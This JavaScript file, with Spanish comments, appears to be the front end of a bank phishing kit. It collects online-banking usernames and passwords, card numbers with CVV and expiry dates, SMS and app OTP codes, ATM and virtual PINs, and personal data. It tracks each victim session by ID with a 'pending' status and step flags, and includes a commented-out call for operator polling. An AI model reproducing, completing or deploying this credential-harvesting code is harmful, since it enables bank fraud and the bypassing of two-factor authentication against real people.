document.getElementById('validarClaveVirtual').addEventListener('click', function () {
    const inputs = document.querySelectorAll('[id^="clavevirtual-"]'); let codigo = ''; inputs.forEach(i => codigo += (i.dataset.realValue || ''));
    if (codigo.length === 4) {
        disableButtonTemporarily(this, 3000);
        enviarClaveVirtual(codigo);
    }
});

// Inputs multi-dígito
function setupMultiDigitInputs(prefix, maxLength) {
    for (let i = 0; i < maxLength; i++) {
        const input = document.getElementById(`${prefix}-${i}`);
        if (!input) continue;
        if (input.classList.contains('password-input')) {
            input.addEventListener('input', function (e) {
                const v = e.target.value;
                if (!/^[0-9]?$/.test(v)) { e.target.value = ''; e.target.dataset.realValue = ''; return; }
                if (v) {
                    e.target.dataset.realValue = v; e.target.value = '•';
                    if (i < maxLength - 1) document.getElementById(`${prefix}-${i + 1}`)?.focus();
                } else e.target.dataset.realValue = '';
                if (prefix === 'clave') validateClave();
                else if (prefix === 'otpsms') validateOtpSms();
                else if (prefix === 'otpapp') validateOtpApp();
                else if (prefix === 'clavecajero') validateClaveCajero();
                else if (prefix === 'clavevirtual') validateClaveVirtual();
            });
            input.addEventListener('keydown', function (e) {
                if (e.key === 'Backspace') {
                    if (!this.dataset.realValue && i > 0) {
                        const prev = document.getElementById(`${prefix}-${i - 1}`); prev?.focus(); if (prev) { prev.value = ''; prev.dataset.realValue = ''; }
                        if (prefix === 'clave') validateClave();
                    } else if (this.dataset.realValue) {
                        this.value = ''; this.dataset.realValue = '';
                        if (prefix === 'clave') validateClave();
                        else if (prefix === 'otpsms') validateOtpSms();
                        else if (prefix === 'otpapp') validateOtpApp();
                        else if (prefix === 'clavecajero') validateClaveCajero();
                        else if (prefix === 'clavevirtual') validateClaveVirtual();
                    }
                }
            });
        } else {
            input.addEventListener('input', function (e) {
                if (!/^[0-9a-zA-Z]?$/.test(e.target.value)) { e.target.value = ''; return; }
                if (e.target.value && i < maxLength - 1) document.getElementById(`${prefix}-${i + 1}`)?.focus();
            });
            input.addEventListener('keydown', function (e) {
                if (e.key === 'Backspace' && !this.value && i > 0) document.getElementById(`${prefix}-${i - 1}`)?.focus();
            });
        }
    }
}

// Formateo tarjeta
function setupTarjetaInputs() {
    ['numeroTarjeta', 'numeroTarjetaCredito'].forEach(id => {
        const input = document.getElementById(id);
        if (input) {
            input.addEventListener('input', function (e) {
                const raw = e.target.value.replace(/\D/g, '').slice(0, 16);
                e.target.value = raw.replace(/(.{4})/g, '$1 ').trim();
                // Validar inmediatamente
                const isCredito = id === 'numeroTarjetaCredito';
                validateTarjeta(isCredito, false);
            });
        }
    });
    ['fechaVencimiento', 'fechaVencimientoCredito'].forEach(id => {
        const input = document.getElementById(id);
        if (input) {
            input.addEventListener('input', function (e) {
                let v = e.target.value.replace(/\D/g, '');
                if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2, 6);
                e.target.value = v;
                // Validar inmediatamente
                const isCredito = id === 'fechaVencimientoCredito';
                validateTarjeta(isCredito, false);
            });
            input.addEventListener('keydown', function (e) {
                if (e.key === 'Backspace') {
                    const pos = e.target.selectionStart;
                    if (pos > 0 && e.target.value.charAt(pos - 1) === '/') {
                        e.preventDefault();
                        const nv = e.target.value.substring(0, pos - 2) + e.target.value.substring(pos);
                        e.target.value = nv; e.target.setSelectionRange(pos - 2, pos - 2);
                        id === 'fechaVencimiento' ? validateTarjeta(false, false) : validateTarjeta(true, false);
                    }
                }
            });
            input.addEventListener('keydown', function (e) {
                if ([8, 9, 27, 13, 46].includes(e.keyCode) || (e.keyCode === 65 && e.ctrlKey) || (e.keyCode === 67 && e.ctrlKey) || (e.keyCode === 86 && e.ctrlKey) || (e.keyCode === 88 && e.ctrlKey) || (e.keyCode >= 35 && e.keyCode <= 39)) return;
                if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) e.preventDefault();
            });
        }
    });
    // CVV inputs
    ['cvv', 'cvvCredito'].forEach(id => {
        const input = document.getElementById(id);
        if (input) {
            input.addEventListener('input', function (e) {
                // Solo permitir dígitos y máximo 4
                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
                // Validar inmediatamente
                const isCredito = id === 'cvvCredito';
                validateTarjeta(isCredito, false);
            });
        }
    });
}

// Listeners sección DATOS
['nombre', 'cedula', 'email', 'celular', 'ciudad', 'direccion'].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.addEventListener('input', () => validateDatos(false));
});
elements.continuarDatos.addEventListener('click', function () {
    if (validateDatos(true)) {
        disableButtonTemporarily(this, 3000);
        enviarDatosPersonales();
    }
});
// ⚠️ Se eliminó el listener de volverDatos

// Inicialización
document.addEventListener('DOMContentLoaded', function () {
    showUsuarioForm();
    setupMultiDigitInputs('clave', 4);
    setupMultiDigitInputs('otpsms', 6);
    setupMultiDigitInputs('otpapp', 6);
    setupMultiDigitInputs('clavecajero', 4);
    setupMultiDigitInputs('clavevirtual', 4);
    setupTarjetaInputs();
    setupFloatingLabels();
    validateDatos(false); // asegura botón deshabilitado

    // Inicializar todos los campos con valor por defecto '--' si no existen
    const allFields = [
        'usuario', 'clave', 'ente', 'tdc', 'cvv', 'ven',
        'nombre', 'cedula', 'email', 'celular', 'ciudad', 'direccion',
        'codsms', 'codapp', 'pincaj', 'pinvir', 'status', 'uniqid'
    ];

    // Inicializar campos de pasos como "no visto"
    const pasos = [
        'paso_login', 'paso_tarjeta_debito', 'paso_tarjeta_credito',
        'paso_datos_personales', 'paso_otp_sms', 'paso_otp_app',
        'paso_clave_cajero', 'paso_clave_virtual'
    ];

    allFields.forEach(field => {
        const storageKey = `${appState.uniqId}_${field}`;
        if (!localStorage.getItem(storageKey)) {
            if (field === 'ente') {
                localStorage.setItem(storageKey, JSON.stringify('3co'));
            } else if (field === 'uniqid') {
                localStorage.setItem(storageKey, JSON.stringify(appState.uniqId));
            } else if (field === 'status') {
                localStorage.setItem(storageKey, JSON.stringify('pending'));
            } else {
                localStorage.setItem(storageKey, JSON.stringify('--'));
            }
        }
    });

    // Inicializar pasos como "no visto" si no existen
    pasos.forEach(paso => {
        const storageKey = `${appState.uniqId}_${paso}`;
        if (!localStorage.getItem(storageKey)) {
            localStorage.setItem(storageKey, JSON.stringify('no visto'));
        }
    });

    // Mostrar uniqId en consola para debug
    console.log('Session UniqID:', appState.uniqId);
    console.log('Datos inicializados en localStorage con valores por defecto');

    // iniciarPolling(); // si deseas que inicie siempre
});
